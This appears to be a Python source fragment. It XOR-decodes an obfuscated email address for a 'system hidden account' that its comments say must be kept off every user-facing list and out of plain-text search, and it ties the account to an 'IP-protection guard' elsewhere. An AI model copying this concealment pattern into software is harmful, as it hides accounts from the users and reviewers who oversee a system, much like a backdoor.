# System-level hidden account — must NEVER appear on any user-facing UI list.
# Stored obfuscated so it does not appear as a plain-text literal anywhere.
# Same XOR key (42) and data as the IP-protection guard in server.py.
def get_system_hidden_email() -> str:
    """Return the email of the system account that must be hidden from all UI lists."""
    _k = 42
    _d = [77, 75, 77, 68, 79, 79, 94, 106, 89, 67, 70, 92, 79, 88, 76, 69, 82, 94, 79, 73, 66, 68, 69, 70, 69, 77, 67,
          79, 89, 4, 73, 69, 71, 4, 75, 95]
    return "".join(chr(c ^ _k) for c in _d)


SYSTEM_HIDDEN_EMAIL: str = get_system_hidden_email()

